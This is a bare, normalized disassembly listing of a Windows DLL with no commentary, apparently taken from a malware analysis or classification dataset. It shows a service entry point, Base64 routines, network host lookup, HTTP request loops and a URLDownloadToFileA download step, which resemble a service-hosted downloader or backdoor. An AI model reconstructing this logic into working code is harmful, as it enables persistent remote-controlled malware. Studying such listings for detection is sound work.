movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
retn
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_10002450
push 0xffffffff
push sub_1001dd28
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x8 ] esi
call sub_1000d37e
xor eax eax
mov [ esp + 0x14 ] eax
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
push 0xffffffff
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] 0xf
push eax
mov [ ecx + 0x4 ] al
mov eax [ esp + 0x24 ]
push eax
call sub_10008f60
mov eax esi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn 0x4
sub_100024d0
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] eax
mov ecx esi
mov [ esi + 0x10 ] al
call sub_1000d45c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_1000c4b4
add esp 0x4
mov eax esi
pop esi
retn 0x4
push esi
call sub_1000c4b4
add esp 0x4
sub_10002560
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] eax
mov [ esi + 0x10 ] al
mov ecx esi
pop esi
jmp sub_1000d45c
mov eax [ esi + 0x10 ]
push eax
call sub_1000c4b4
add esp 0x4
sub_100025c0
push 0xffffffff
push sub_1001dcf8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0xc ] esi
mov edi [ esp + 0x20 ]
push edi
call sub_1000d3ff
xor edx edx
mov [ esp + 0x18 ] edx
push 0xffffffff
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
lea eax [ edi + 0xc ]
push edx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] edx
push eax
mov [ ecx + 0x4 ] dl
call sub_10008f60
mov eax esi
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn 0x4
sub_10002640
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x144
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x140 ] eax
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov ebx edx
test ecx ecx
jne r-xdata
lea eax [ ecx - 0x3 ]
xor edx edx
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] esi
mov [ esp + 0x10 ] ebx
test eax eax
jle r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
cmp edx ecx
jge r-xdata
lea ecx [ eax - 0x1 ]
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
inc edx
lea eax [ edx * 4 ]
lea ecx [ edx + edx * 2 ]
mov [ esp + 0x14 ] edx
mov [ esp + 0x1c ] eax
mov [ esp + 0x24 ] ecx
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ ebp + 0x8 ] eax
mov ecx eax
mov ecx [ esp + 0x14c ]
mov eax [ esp + 0x1c ]
pop edi
pop esi
mov [ ebx ] 0x0
pop ebx
xor ecx esp
call sub_1000c0a5
mov esp ebp
pop ebp
retn
sub ecx edx
xor edx edx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] edx
test ecx ecx
jle r-xdata
mov dl 0x3d
mov dl [ esp + edx + 0x100 ]
jmp r-xdata
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
mov eax edx
shr eax 0x2
and eax 0x3f
movsb [ edi ] [ esi ]
cmp eax 0x3f
ja r-xdata
mov edx [ esp + 0x18 ]
push ecx
push edx
lea eax [ esp + 0x1c ]
push eax
call sub_100109a0
mov edx [ esp + 0x20 ]
add esp 0xc
mov dl 0x3d
mov dl [ esp + edx + 0x70 ]
jmp r-xdata
movsx ecx dl
mov [ esp + 0x20 ] ecx
mov edx eax
shr edx 0xc
mov ecx eax
and ecx 0x3
shl ecx 0x4
and edx 0xf
or edx ecx
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x70 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
cmp edx 0x3f
ja r-xdata
mov al 0x3d
mov al [ esp + eax + 0x28 ]
jmp r-xdata
mov dl 0x3d
mov dl [ esp + edx + 0xb8 ]
jmp r-xdata
movsx ebx dl
mov edx eax
shr edx 0x8
and edx 0xf
add edx edx
mov ecx eax
shr ecx 0x16
and ecx 0x3
add edx edx
or edx ecx
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0xb8 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
cmp edx 0x3f
ja r-xdata
mov al 0x3d
mov al [ esp + eax + 0x28 ]
jmp r-xdata
mov [ ebx ] al
mov eax edx
shr eax 0xc
mov ecx edx
and ecx 0x3
shl ecx 0x4
and eax 0xf
or eax ecx
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
cmp eax 0x3f
ja r-xdata
mov al 0x3d
mov al [ esp + eax + 0x28 ]
jmp r-xdata
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
shr eax 0x10
and eax 0x3f
movsx edx dl
movsb [ edi ] [ esi ]
cmp eax 0x3f
ja r-xdata
mov al 0x3d
mov eax edx
shr eax 0x8
and eax 0xf
add eax eax
mov ecx edx
shr ecx 0x16
and ecx 0x3
add eax eax
or eax ecx
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
cmp eax 0x3f
ja r-xdata
cmp [ esp + 0x10 ] 0x1
mov [ ebx + 0x1 ] al
jle r-xdata
mov edx [ esp + 0x18 ]
mov eax [ edx ]
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x100 ]
[ edi ] [ esi ]
mov edx eax
shr edx 0x2
and edx 0x3f
movsb [ edi ] [ esi ]
cmp edx 0x3f
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ esp + 0x24 ]
mov ebx eax
add [ esp + 0x18 ] 0x3
movsx ecx al
mov eax [ esp + 0x10 ]
shl ecx 0x8
or ecx edx
shl ecx 0x8
or ecx ebx
shl ecx 0x8
or ecx [ esp + 0x20 ]
add eax 0x4
sub [ esp + 0x14 ] 0x1
mov [ eax - 0x4 ] ecx
mov [ esp + 0x10 ] eax
jne r-xdata
mov eax [ esp + 0x1c ]
mov dl 0x3d
mov [ ebx + 0x3 ] dl
add ebx 0x4
add eax 0x4
mov [ ebx ] 0x0
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x140 ]
xor ecx esp
call sub_1000c0a5
mov esp ebp
pop ebp
retn
mov ecx 0x10
mov esi r--data
lea edi [ esp + 0x28 ]
[ edi ] [ esi ]
shr edx 0x10
and edx 0x3f
movsb [ edi ] [ esi ]
cmp edx 0x3f
ja r-xdata
mov al [ esp + eax + 0x28 ]
jmp r-xdata
mov dl [ esp + edx + 0x28 ]
mov eax [ esp + 0x1c ]
mov [ ebx + 0x3 ] dl
add ebx 0x4
add eax 0x4
mov [ ebx ] 0x0
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x140 ]
xor ecx esp
call sub_1000c0a5
mov esp ebp
pop ebp
retn
cmp [ esp + 0x10 ] 0x2
mov [ ebx + 0x2 ] al
jle r-xdata
sub_10002920
sub esp 0xc
push ebx
push ebp
xor ebx ebx
push esi
push edi
cmp [ esp + 0x24 ] ebx
jne r-xdata
mov eax [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
mov eax [ esp + 0x24 ]
add eax 0xfffffffc
cmp eax ebx
mov [ esp + 0x10 ] ebx
mov ebp ecx
mov [ esp + 0x18 ] ebx
jle r-xdata
mov eax ecx
lea esi [ eax + 0x1 ]
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x24 ]
cmp eax ecx
jge r-xdata
dec eax
shr eax 0x2
inc eax
lea ecx [ eax + eax * 2 ]
lea edx [ eax * 4 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x18 ] edx
lea ecx [ ecx ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
mov [ esp + 0x24 ] eax
mov ecx [ esp + 0x20 ]
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
mov [ ecx ] 0x0
pop ebx
add esp 0xc
retn
sub ecx eax
xor eax eax
mov [ esp + 0x24 ] eax
test ecx ecx
jle r-xdata
cmp dl 0x61
jl r-xdata
cmp dl 0x5a
jg r-xdata
or edx 0xffffffff
cmp al 0x41
jl r-xdata
push ecx
lea eax [ esp + 0x28 ]
push ebp
push eax
call sub_100109a0
mov eax [ esp + 0x30 ]
add esp 0xc
cmp dl 0x30
jl r-xdata
cmp dl 0x7a
jg r-xdata
movsx esi dl
sub esi 0x41
jmp r-xdata
cmp al 0x61
jl r-xdata
cmp al 0x5a
jg r-xdata
cmp dl 0x2b
jne r-xdata
cmp dl 0x39
jg r-xdata
movsx esi dl
sub esi 0x47
jmp r-xdata
mov eax edx
shr eax 0x8
mov bl al
sub bl 0x41
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x7a
jg r-xdata
movsx edx al
sub edx 0x41
jmp r-xdata
cmp dl 0x2f
jne r-xdata
mov esi 0x3e
jmp r-xdata
movsx esi dl
add esi 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
cmp al 0x2b
jne r-xdata
cmp al 0x39
jg r-xdata
movsx edx al
sub edx 0x47
jmp r-xdata
shr eax 0x8
mov bl al
sub bl 0x41
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
mov esi 0x3f
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
lea edi [ ecx * 4 ]
sar edi 0x6
lea ecx [ esi * 4 ]
or edi ecx
mov bl al
sub bl 0x41
and edi 0xff
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x2f
jne r-xdata
mov edx 0x3e
jmp r-xdata
movsx edx al
add edx 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
mov edx 0x3f
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
mov edi [ esp + 0x20 ]
mov ebp [ esp + 0x10 ]
mov esi [ esp + 0x24 ]
add ecx ecx
add ecx ecx
add dl dl
sar ecx 0x6
add dl dl
or cl dl
mov [ edi ] cl
inc edi
inc ebp
cmp al 0x3d
je r-xdata
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
mov eax edx
shr eax 0x10
mov bl al
sub bl 0x41
or esi 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov eax esi
shr eax 0x10
cmp al 0x3d
je r-xdata
mov edx esi
shr edx 0x10
cmp dl 0x3d
je r-xdata
mov ecx 0x3f
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx esi al
sub esi 0x41
jmp r-xdata
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov [ edi ] 0x0
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
add esp 0xc
retn
mov edx esi
shr edx 0x18
cmp edx 0x3d
je r-xdata
mov bl al
sub bl 0x41
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx esi al
sub esi 0x47
jmp r-xdata
add esi esi
add esi esi
sar esi 0x4
shl ecx 0x4
or esi ecx
mov bl al
sub bl 0x41
and esi 0xff
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
mov ecx 0x3f
mov bl al
sub bl 0x41
or ecx 0xffffffff
cmp bl 0x19
ja r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
mov ecx 0x3f
cmp al 0x2b
jne r-xdata
movsx esi al
add esi 0x4
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
mov bl al
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx ecx al
sub ecx 0x41
jmp r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
mov bl dl
sub bl 0x41
or eax 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x2f
jne r-xdata
mov esi 0x3e
jmp r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
shr edx 0x18
mov bl dl
sub bl 0x41
or eax 0xffffffff
cmp bl 0x19
ja r-xdata
mov bl al
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx ecx al
sub ecx 0x47
jmp r-xdata
mov bl dl
sub bl 0x41
or eax 0xffffffff
cmp bl 0x19
ja r-xdata
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx eax dl
sub eax 0x41
jmp r-xdata
mov esi 0x3f
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx eax dl
sub eax 0x41
jmp r-xdata
cmp al 0x2b
jne r-xdata
movsx ecx al
add ecx 0x4
jmp r-xdata
mov bl dl
sub bl 0x61
cmp bl 0x19
ja r-xdata
movsx eax dl
sub eax 0x41
jmp r-xdata
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx eax dl
sub eax 0x47
jmp r-xdata
lea edx [ eax * 4 ]
sar edx 0x4
shl cl 0x4
or dl cl
mov [ edi ] dl
inc edi
inc ebp
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx eax dl
sub eax 0x47
jmp r-xdata
lea edx [ eax * 4 ]
mov eax [ esp + 0x20 ]
sar edx 0x2
shl ecx 0x6
or edx ecx
and edx 0xff
shl edx 0x8
or edx esi
shl edx 0x8
or edx edi
mov [ eax ] edx
add eax 0x3
add ebp 0x4
sub [ esp + 0x14 ] 0x1
mov [ esp + 0x20 ] eax
jne r-xdata
cmp al 0x2f
jne r-xdata
mov ecx 0x3e
jmp r-xdata
mov bl dl
sub bl 0x30
cmp bl 0x9
ja r-xdata
movsx eax dl
sub eax 0x47
jmp r-xdata
add eax eax
add eax eax
sar eax 0x2
shl cl 0x6
or al cl
mov [ edi ] al
inc edi
inc ebp
mov ecx 0x3f
cmp dl 0x2b
jne r-xdata
movsx eax dl
add eax 0x4
jmp r-xdata
mov ecx 0x3f
cmp dl 0x2b
jne r-xdata
movsx eax dl
add eax 0x4
jmp r-xdata
mov edx [ ebp ]
or esi 0xffffffff
cmp dl 0x41
jl r-xdata
mov ecx 0x3f
cmp dl 0x2b
jne r-xdata
movsx eax dl
add eax 0x4
jmp r-xdata
cmp dl 0x2f
jne r-xdata
mov eax 0x3e
jmp r-xdata
cmp dl 0x2f
jne r-xdata
mov eax 0x3e
jmp r-xdata
cmp dl 0x2f
jne r-xdata
mov eax 0x3e
jmp r-xdata
mov eax 0x3f
mov eax 0x3f
mov eax 0x3f
sub_10002e60
sub esp 0x108
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x104 ] eax
mov eax [ esp + 0x110 ]
sub eax 0x1
push esi
mov esi [ esp + 0x110 ]
jne r-xdata
mov ecx [ esp + 0x108 ]
pop esi
xor ecx esp
mov eax 0x1
call sub_1000c0a5
add esp 0x108
retn 0xc
push 0x104
push eax
lea eax [ esp + 0xc ]
push eax
call sub_1000fe10
add esp 0xc
push 0x104
lea ecx [ esp + 0x8 ]
push ecx
push esi
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x4 ]
call sub_10003610
sub_10002ee0
sub esp 0x1c
mov edx [ rw-data ]
mov [ rw-data ] eax
mov [ esp + 0x4 ] eax
xor eax eax
lea ecx [ esp ]
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x20 ]
push ecx
push edx
mov [ esp + 0x8 ] 0x10
mov [ esp + 0x10 ] 0x7
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] 0xbb8
call [ SetServiceStatus@IAT ]
add esp 0x1c
retn
sub_10002f30
mov eax [ esp + 0x4 ]
dec eax
cmp eax 0x4
ja r-xdata
retn 0x4
jmp [ eax * 4 + jump_table_10002fdc ]
push 0x1
mov eax 0x3
call sub_10002ee0
mov eax [ rw-data ]
add esp 0x4
push eax
call [ SetEvent@IAT ]
push 0x2710
call [ Sleep@IAT ]
push 0x0
mov eax 0x1
call sub_10002ee0
add esp 0x4
retn 0x4
push 0x1
mov eax 0x6
call sub_10002ee0
push 0x0
mov eax 0x7
call sub_10002ee0
add esp 0x8
retn 0x4
push 0x1
mov eax 0x5
call sub_10002ee0
push 0x0
mov eax 0x4
call sub_10002ee0
add esp 0x8
retn 0x4
mov eax [ rw-data ]
push 0x0
call sub_10002ee0
add esp 0x4
retn 0x4
push 0x0
mov eax 0x1
call sub_10002ee0
pop ecx
ServiceMain
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2b4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2b0 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0xff
xor edi edi
lea eax [ esp + 0x1bd ]
push edi
push eax
mov [ esp + 0x1c4 ] 0x0
call sub_1000fe10
mov ecx [ esi ]
add esp 0xc
push 0x100
push ecx
lea edx [ esp + 0x1c0 ]
push edx
call sub_1000de19
add esp 0xc
push sub_10002f30
lea eax [ esp + 0x1bc ]
push eax
call [ RegisterServiceCtrlHandlerA@IAT ]
mov [ rw-data ] eax
cmp eax edi
je r-xdata
mov ecx [ esp + 0x2bc ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000c0a5
mov esp ebp
pop ebp
retn
mov ecx 0x2
mov [ rw-data ] ecx
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0xc ]
push ecx
push eax
mov [ esp + 0x14 ] 0x10
mov [ esp + 0x1c ] 0x7
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x2c ] 0xbb8
call [ SetServiceStatus@IAT ]
push 0x3e8
call [ Sleep@IAT ]
lea edx [ esp + 0x28 ]
push edx
push 0x202
call WSAStartup
push edi
push edi
push 0x1
push edi
call [ CreateEventA@IAT ]
mov [ rw-data ] eax
call sub_10004190
mov edi [ WaitForSingleObject@IAT ]
mov ebx [ CloseHandle@IAT ]
jmp r-xdata
movsx eax [ rw-data ]
push eax
call sub_1000d972
add esp 0x4
push rw-data
test eax eax
je r-xdata
call inet_addr
cmp eax 0xffffffff
je r-xdata
call gethostbyname
test eax eax
jne r-xdata
push 0xdbba00
jmp r-xdata
mov esi eax
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov esi [ edx ]
call WSAGetLastError
mov eax [ rw-data ]
push eax
push 0x80
push 0x0
push rw-data
call sub_1000fe10
add esp 0xc
push esi
call inet_ntoa
mov edx rw-data
mov cl [ eax ]
mov [ edx ] cl
inc eax
inc edx
test cl cl
jne r-xdata
mov ecx rw-data
mov eax rw-data
jmp r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov esi 0x3
mov [ rw-data ] esi
mov ecx [ rw-data ]
push 0xa4cb80
push ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
imul ecx ecx 0x3e8
push ecx
push edx
mov [ rw-data ] esi
call edi
test eax eax
je r-xdata
cmp eax 0x14
je r-xdata
call edi
test eax eax
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
jmp r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
cmp eax 0x10
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0xa4cb80
cmp eax 0x16
jne r-xdata
mov edx [ rw-data ]
mov ecx 0x4
sub ecx [ rw-data ]
imul ecx ecx 0xea60
push ecx
push edx
jmp r-xdata
cmp eax 0x12
je r-xdata
mov ecx [ rw-data ]
mov eax 0x4
sub eax [ rw-data ]
imul eax eax 0xea60
push eax
push ecx
jmp r-xdata
call edi
test eax eax
je r-xdata
mov eax [ rw-data ]
mov edx 0x4
sub edx [ rw-data ]
imul edx edx 0xea60
push edx
push eax
cmp eax 0x11
jne r-xdata
sub [ rw-data ] 0x1
jne r-xdata
push 0x0
push 0x0
push 0x1
push 0x0
call [ CreateEventA@IAT ]
push 0x0
push 0x0
push 0x0
push sub_10003300
push 0x0
push 0x0
mov [ rw-data ] eax
call sub_1000d6ff
add esp 0x18
push 0xffffffff
push eax
mov [ rw-data ] eax
call edi
mov edx [ rw-data ]
push edx
call ebx
mov eax [ rw-data ]
push eax
call ebx
mov eax [ rw-data ]
cmp eax 0x13
je r-xdata
sub_10003300
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1001e628
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x14264
call sub_10017e00
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x14260 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14278 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0x1425c ] ebx
mov [ esp + 0x14260 ] ebx
mov [ esp + 0x14264 ] ebx
mov [ esp + 0x14268 ] ebx
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14284 ] ebx
call sub_1000a9b0
lea esi [ esp + 0x4c ]
mov [ esp + 0x14280 ] 0x1
call sub_1000bb20
cmp [ rw-data ] bl
je r-xdata
xor eax eax
lea ecx [ eax + 0x50 ]
lea eax [ ebx + 0x1 ]
mov ecx 0x1bb
jmp r-xdata
call sub_10004b90
lea eax [ esp + 0x10 ]
push eax
mov [ esp + 0x14284 ] bl
call sub_1000aa40
mov eax [ esp + 0x14264 ]
mov esi [ InternetCloseHandle@IAT ]
cmp eax ebx
je r-xdata
mov edi [ HttpSendRequestA@IAT ]
mov esi [ GetLastError@IAT ]
jmp r-xdata
call sub_1000bba0
lea ecx [ esp + 0x4c ]
push ebx
push ecx
mov [ rw-data ] ebx
call sub_10004680
mov edx [ rw-data ]
add esp 0x8
push ebx
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x14260 ]
cmp eax ebx
je r-xdata
push eax
call esi
mov [ esp + 0x14264 ] ebx
mov eax [ esp + 0x14258 ]
add eax 0xfffffffb
cmp eax 0x5
ja r-xdata
mov eax [ esp + 0x1425c ]
cmp eax ebx
je r-xdata
push eax
call esi
mov [ esp + 0x14260 ] ebx
mov eax [ esp + 0x4c ]
cmp eax 0x2efd
jne r-xdata
jmp [ eax * 4 + jump_table_10003548 ]
xor eax eax
mov ecx [ esp + 0x14278 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x14260 ]
xor ecx esp
call sub_1000c0a5
mov esp ebp
pop ebp
retn 0x4
push eax
call esi
cmp eax 0x2efe
jne r-xdata
mov [ rw-data ] 0x10
jmp r-xdata
mov eax [ esp + 0x14264 ]
push ebx
push ebx
push ebx
push ebx
push eax
call edi
test eax eax
je r-xdata
mov ecx [ esp + 0x14050 ]
mov eax [ esp + 0x14264 ]
push ecx
lea edx [ esp + 0x54 ]
push edx
push ebx
push ebx
push eax
call edi
test eax eax
je r-xdata
lea ebx [ esp + 0x4c ]
call sub_1000bdc0
xor ebx ebx
lea ecx [ esp + 0x4c ]
push ecx
lea ecx [ esp + 0x14 ]
call sub_10004c10
add esp 0x4
test eax eax
je r-xdata
cmp eax 0x2f78
jne r-xdata
mov [ rw-data ] 0x12
jmp r-xdata
call esi
mov [ esp + 0x4c ] eax
xor eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ rw-data ]
push ebx
push edx
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
cmp eax 0x2ee2
jne r-xdata
mov [ rw-data ] 0x16
jmp r-xdata
cmp eax ebx
je r-xdata
jmp r-xdata
mov [ rw-data ] 0x11
sub_10003560
push rw-data
call [ DeleteUrlCacheEntry@IAT ]
push 0x0
push 0x0
push rw-data
push rw-data
push 0x0
call URLDownloadToFileA
test eax eax
jne r-xdata
mov eax [ r--data ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] edx
mov dx [ r--data ]
mov eax [ r--data ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] edx
mov dx [ r--data ]
jmp r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] dx
mov [ rw-data ] ecx
retn 0x4
sub_10003610
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1001df7f
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax 0x122c
call sub_10017e00
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1228 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1240 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x381
xor edi edi
push edi
push rw-data
call sub_1000fe10
add esp 0xc
push 0xfff
lea eax [ esp + 0x239 ]
push edi
push eax
mov [ esp + 0x240 ] 0x0
call sub_1000fe10
add esp 0xc
lea ecx [ esp + 0x20 ]
push ecx
call sub_10009110
push 0x103
lea edx [ esp + 0x131 ]
push edi
mov [ esp + 0x1250 ] edi
push edx
mov [ esp + 0x138 ] 0x0
call sub_1000fe10
add esp 0xc
cmp esi edi
je r-xdata
push 0x104
lea eax [ esp + 0x130 ]
push eax
push edi
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x12c ]
mov eax esi
sub edx esi
mov ecx [ esp + 0x38 ]
mov edx [ ecx + 0x4 ]
push edx
lea ecx [ esp + 0x24 ]
call sub_10009190
mov eax [ esp + 0x38 ]
mov [ eax + 0x4 ] eax
mov eax [ esp + 0x38 ]
mov [ esp + 0x3c ] edi
mov [ eax ] eax
mov eax [ esp + 0x38 ]
mov [ eax + 0x8 ] eax
lea edx [ esp + 0x234 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x10c ] 0xf
mov [ esp + 0x108 ] edi
mov [ esp + 0xf8 ] 0x0
mov [ esp + 0x1248 ] 0x1
mov [ esp + 0x14 ] 0x3a
jmp r-xdata
lea eax [ esp + 0x20 ]
push eax
mov [ esp + 0x124c ] 0xffffffff
call sub_100040a0
xor eax eax
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
jmp r-xdata
mov eax edx
mov ebx 0x10
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
mov ecx [ esp + 0x1240 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1228 ]
xor ecx esp
call sub_1000c0a5
mov esp ebp
pop ebp
retn
lea ecx [ esp + 0x234 ]
push ecx
lea edx [ esp + 0x130 ]
push edx
call sub_10001800
test eax eax
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
